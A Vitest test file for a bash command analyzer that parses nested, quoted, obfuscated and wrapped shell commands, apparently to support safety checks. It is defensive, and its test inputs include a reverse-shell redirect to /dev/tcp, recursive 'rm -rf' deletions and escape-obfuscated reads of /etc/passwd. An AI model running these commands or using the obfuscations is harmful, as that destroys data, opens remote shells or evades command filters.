import { beforeAll, describe, expect, it } from "vitest";
import { BashAnalyzer } from "../../../src/analyzers/bash-analyzer.js";

let analyzer: BashAnalyzer;

beforeAll(async () => {
	analyzer = await BashAnalyzer.create();
});

describe("BashAnalyzer — plain", () => {
	it("parses a single command with args", async () => {
		const r = await analyzer.analyze("rm -rf /tmp/foo");
		expect(r.parseError).toBeUndefined();
		expect(r.commands).toHaveLength(1);
		expect(r.commands[0]?.argv).toEqual(["rm", "-rf", "/tmp/foo"]);
	});

	it("captures raw source per command", async () => {
		const r = await analyzer.analyze("ls -la");
		expect(r.commands[0]?.raw).toBe("ls -la");
	});
});

describe("BashAnalyzer — concatenation", () => {
	it("joins concatenated single-quoted parts", async () => {
		const r = await analyzer.analyze("echo 'x''y'");
		expect(r.commands[0]?.argv).toEqual(["echo", "xy"]);
	});

	it("joins mixed-quote concatenations", async () => {
		const r = await analyzer.analyze("echo 'x'\"y\"");
		expect(r.commands[0]?.argv).toEqual(["echo", "xy"]);
	});
});

describe("BashAnalyzer — compound", () => {
	it("extracts both sides of a pipe", async () => {
		const r = await analyzer.analyze("cat file | grep foo");
		expect(r.commands).toHaveLength(2);
		expect(r.commands[0]?.argv).toEqual(["cat", "file"]);
		expect(r.commands[1]?.argv).toEqual(["grep", "foo"]);
		expect(r.commands[0]?.pipeNext).toBe(r.commands[1]);
		expect(r.commands[1]?.pipePrev).toBe(r.commands[0]);
	});

	it("extracts commands separated by &&", async () => {
		const r = await analyzer.analyze("ls && rm -rf /tmp/x");
		expect(r.commands).toHaveLength(2);
		expect(r.commands[1]?.argv).toEqual(["rm", "-rf", "/tmp/x"]);
	});

	it("extracts both commands from a semicolon-separated list", async () => {
		const r = await analyzer.analyze("echo a; echo b");
		expect(r.commands.map((c) => c.argv[0])).toEqual(["echo", "echo"]);
	});

	it("extracts commands separated by newlines", async () => {
		const r = await analyzer.analyze("rm a\nrm b");
		expect(r.commands).toHaveLength(2);
	});

	it("extracts inner commands from a subshell", async () => {
		const r = await analyzer.analyze("(cd /tmp && rm x)");
		expect(r.commands.map((c) => c.argv[0])).toEqual(["cd", "rm"]);
	});
});

describe("BashAnalyzer — nested", () => {
	it("descends into command substitution", async () => {
		const r = await analyzer.analyze('echo "$(rm -rf /tmp)"');
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("echo");
		expect(names).toContain("rm");
	});

	it("descends into backticks", async () => {
		const r = await analyzer.analyze("echo `rm -rf /tmp`");
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("rm");
	});

	it("re-parses the string passed to bash -c", async () => {
		const r = await analyzer.analyze('bash -c "rm -rf /tmp/foo"');
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("bash");
		expect(names).toContain("rm");
	});

	it("re-parses the string passed to sh -c", async () => {
		const r = await analyzer.analyze("sh -c 'ls && rm -rf /tmp'");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});
});

describe("BashAnalyzer — redirects and errors", () => {
	it("captures a > redirect", async () => {
		const r = await analyzer.analyze("echo hi > /tmp/out");
		expect(r.commands[0]?.redirects).toEqual([{ op: ">", target: "/tmp/out" }]);
	});

	it("captures >> redirect", async () => {
		const r = await analyzer.analyze("echo hi >> /tmp/out");
		expect(r.commands[0]?.redirects[0]?.op).toBe(">>");
	});

	it("reports parseError on unterminated quote", async () => {
		const r = await analyzer.analyze("rm 'unclosed");
		expect(r.parseError).toBeDefined();
	});
});

describe("BashAnalyzer — argvKinds", () => {
	it("tags literal argv0 as 'literal'", async () => {
		const r = await analyzer.analyze("rm -rf /tmp");
		expect(r.commands[0]?.argvKinds[0]).toBe("literal");
	});

	it("tags all plain tokens as 'literal'", async () => {
		const r = await analyzer.analyze("rm -rf /tmp");
		expect(r.commands[0]?.argvKinds).toEqual(["literal", "literal", "literal"]);
	});
});

describe("BashAnalyzer — argv0Basename", () => {
	it("computes argv0Basename for /bin/rm", async () => {
		const r = await analyzer.analyze("/bin/rm -rf /tmp");
		expect(r.commands[0]?.argv0Basename).toBe("rm");
	});

	it("argv0Basename equals argv[0] for plain rm", async () => {
		const r = await analyzer.analyze("rm -rf /tmp");
		expect(r.commands[0]?.argv0Basename).toBe("rm");
	});

	it("computes argv0Basename for deeply nested path", async () => {
		const r = await analyzer.analyze("/usr/local/bin/node --version");
		expect(r.commands[0]?.argv0Basename).toBe("node");
	});
});

describe("BashAnalyzer — source tracking", () => {
	it("emits source='top' for outermost commands", async () => {
		const r = await analyzer.analyze("rm -rf /tmp");
		expect(r.commands[0]?.source).toBe("top");
	});

	it("emits source='shell-c' for bash -c payload", async () => {
		const r = await analyzer.analyze('bash -c "rm -rf /tmp"');
		const inner = r.commands.find((c) => c.argv[0] === "rm");
		expect(inner?.source).toBe("shell-c");
	});

	it("emits source='top' for the outer bash command itself", async () => {
		const r = await analyzer.analyze('bash -c "rm -rf /tmp"');
		const outer = r.commands.find((c) => c.argv[0] === "bash");
		expect(outer?.source).toBe("top");
	});
});

describe("BashAnalyzer — C1: eval re-parse", () => {
	it("re-parses an eval string payload", async () => {
		const r = await analyzer.analyze("eval 'rm -rf /tmp'");
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("eval");
		expect(names).toContain("rm");
		const innerRm = r.commands.find((c) => c.argv[0] === "rm");
		expect(innerRm?.source).toBe("eval");
	});

	it("does not re-parse eval when payload contains a variable", async () => {
		const r = await analyzer.analyze("eval $cmd");
		// The eval still appears, but no inner rm/etc — payload is opaque
		expect(r.commands.map((c) => c.argv[0])).toEqual(["eval"]);
	});
});

describe("BashAnalyzer — C2: argv0Basename edge cases", () => {
	it("argv0Basename handles ./scripts/foo.sh", async () => {
		const r = await analyzer.analyze("./scripts/foo.sh arg1");
		expect(r.commands[0]?.argv0Basename).toBe("foo.sh");
	});

	it("argv0Basename leaves $X as-is (not literal)", async () => {
		const r = await analyzer.analyze("$X -rf /");
		// argv[0] is "$X"; argv0Basename should equal argv[0] since it's not a literal
		expect(r.commands[0]?.argvKinds[0]).toBe("variable");
		expect(r.commands[0]?.argv0Basename).toBe(r.commands[0]?.argv[0]);
	});
});

describe("BashAnalyzer — C3: substitution as argv0", () => {
	it("tags $(...) at argv0 as 'substitution' and extracts inner", async () => {
		const r = await analyzer.analyze("$(echo rm) -rf /");
		// outer command has argv0Kind = substitution
		const outer = r.commands.find((c) => c.source === "top");
		expect(outer?.argvKinds[0]).toBe("substitution");
		// inner echo extracted from substitution
		const inner = r.commands.find((c) => c.argv[0] === "echo");
		expect(inner?.source).toBe("substitution");
	});
});

describe("BashAnalyzer — C4-C6: AST-aware decodeNode", () => {
	it("decodes 'r''m' concatenation as 'rm'", async () => {
		const r = await analyzer.analyze("'r''m' -rf /tmp");
		expect(r.commands[0]?.argv[0]).toBe("rm");
	});

	it('decodes "r""m" concatenation as \'rm\'', async () => {
		const r = await analyzer.analyze('"r""m" -rf /tmp');
		expect(r.commands[0]?.argv[0]).toBe("rm");
	});

	it("decodes c\\at backslash-escape word", async () => {
		const r = await analyzer.analyze("c\\at /etc/passwd");
		expect(r.commands[0]?.argv[0]).toBe("cat");
	});

	it("decodes $'\\143at' ansi-c octal", async () => {
		const r = await analyzer.analyze("$'\\143at' /etc/passwd");
		// \143 octal = 99 decimal = 'c'
		expect(r.commands[0]?.argv[0]).toBe("cat");
	});

	it("decodes $'\\x63at' ansi-c hex", async () => {
		const r = await analyzer.analyze("$'\\x63at' /etc/passwd");
		expect(r.commands[0]?.argv[0]).toBe("cat");
	});

	it("decodes $'\\nat' ansi-c escape", async () => {
		const r = await analyzer.analyze("$'\\nat' /etc/passwd");
		expect(r.commands[0]?.argv[0]).toBe("\nat");
	});
});

describe("BashAnalyzer — H1: process substitution", () => {
	it("walks <(...) process substitution", async () => {
		const r = await analyzer.analyze("diff <(rm -rf /tmp) /dev/null");
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("diff");
		expect(names).toContain("rm");
		const inner = r.commands.find((c) => c.argv[0] === "rm");
		expect(inner?.source).toBe("process-substitution");
	});

	it("walks >(...) process substitution", async () => {
		const r = await analyzer.analyze("tee >(cat > /tmp/log) /dev/null");
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("cat");
	});

	it("tags process_substitution argv with kind 'process-substitution'", async () => {
		const r = await analyzer.analyze("diff <(echo a) <(echo b)");
		const outer = r.commands.find((c) => c.argv[0] === "diff");
		// both args should be process-substitution
		expect(outer?.argvKinds.slice(1)).toEqual(["process-substitution", "process-substitution"]);
	});
});

describe("BashAnalyzer — H3: transparent wrappers", () => {
	it("extracts wrapped command from env VAR=val cmd args", async () => {
		const r = await analyzer.analyze("env FOO=bar rm -rf /tmp");
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("env");
		expect(names).toContain("rm");
		const wrapped = r.commands.find((c) => c.argv[0] === "rm");
		expect(wrapped?.source).toBe("wrapper");
		expect(wrapped?.argv0Basename).toBe("rm");
	});

	it("extracts wrapped command from env -i cmd", async () => {
		const r = await analyzer.analyze("env -i rm -rf /tmp");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("extracts wrapped command from timeout", async () => {
		const r = await analyzer.analyze("timeout 5 rm -rf /tmp");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("extracts wrapped command from nohup", async () => {
		const r = await analyzer.analyze("nohup rm -rf /tmp");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("extracts wrapped command from nice -n 10 cmd", async () => {
		const r = await analyzer.analyze("nice -n 10 rm -rf /tmp");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("does NOT extract a wrapper when no inner command identifiable", async () => {
		const r = await analyzer.analyze("env --help");
		// only env itself, no wrapped command
		expect(r.commands.map((c) => c.argv[0])).toEqual(["env"]);
	});
});

describe("BashAnalyzer — H5: shell -c flag clusters", () => {
	it("re-parses bash -lic 'payload'", async () => {
		const r = await analyzer.analyze("bash -lic 'rm -rf /tmp'");
		const names = r.commands.map((c) => c.argv[0]);
		expect(names).toContain("rm");
		const inner = r.commands.find((c) => c.argv[0] === "rm");
		expect(inner?.source).toBe("shell-c");
	});

	it("re-parses bash -cl 'payload'", async () => {
		const r = await analyzer.analyze("bash -cl 'rm -rf /tmp'");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("re-parses sh -ic 'payload'", async () => {
		const r = await analyzer.analyze("sh -ic 'rm -rf /tmp'");
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("does NOT re-parse bash -li (no c)", async () => {
		const r = await analyzer.analyze("bash -li ./script.sh");
		expect(r.commands.map((c) => c.argv[0])).toEqual(["bash"]);
	});
});

describe("BashAnalyzer — H4/M7/M8: limits", () => {
	it("rejects oversized input", async () => {
		const big = `echo ${"a".repeat(70000)}`;
		const r = await analyzer.analyze(big);
		expect(r.parseError).toMatch(/maximum size/);
	});

	it("rejects deeply nested substitutions", async () => {
		// Build $(echo $(echo $(... 20 levels deep ...)))
		let cmd = "echo rm";
		for (let i = 0; i < 20; i++) cmd = `echo $(${cmd})`;
		const r = await analyzer.analyze(cmd);
		expect(r.parseError).toMatch(/nesting depth/);
	});

	it("does not flag depth for normal nesting (3 levels)", async () => {
		const r = await analyzer.analyze("echo $(echo $(rm -rf /tmp))");
		expect(r.parseError).toBeUndefined();
		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
	});

	it("rejects too many commands", async () => {
		// 300 commands separated by ;
		const many = Array.from({ length: 300 }, () => "true").join(" ; ");
		const r = await analyzer.analyze(many);
		expect(r.parseError).toMatch(/too many|>256/);
	});
});

describe("BashAnalyzer — redirect honesty", () => {
	it("captures 2>&1 with fd in op", async () => {
		const r = await analyzer.analyze("cat foo 2>&1");
		expect(r.commands[0]?.redirects.length).toBeGreaterThan(0);
		const redir = r.commands[0]?.redirects[0];
		// op should include the fd number: "2>&"
		expect(redir?.op).toMatch(/2/);
		// target should be "1" (the destination fd)
		expect(redir?.target).toBe("1");
	});

	it("captures redirects on a piped command (bash -i >& /dev/tcp/...)", async () => {
		const r = await analyzer.analyze("bash -i >& /dev/tcp/host/port");
		expect(r.commands[0]?.redirects.length).toBeGreaterThan(0);
		expect(r.commands[0]?.redirects[0]?.target).toBe("/dev/tcp/host/port");
	});

	it("captures redirects when the command is in a pipe", async () => {
		const r = await analyzer.analyze("cat foo > out | grep bar");
		const cat = r.commands.find((c) => c.argv[0] === "cat");
		expect(cat?.redirects.some((redir) => redir.target === "out")).toBe(true);
	});
});
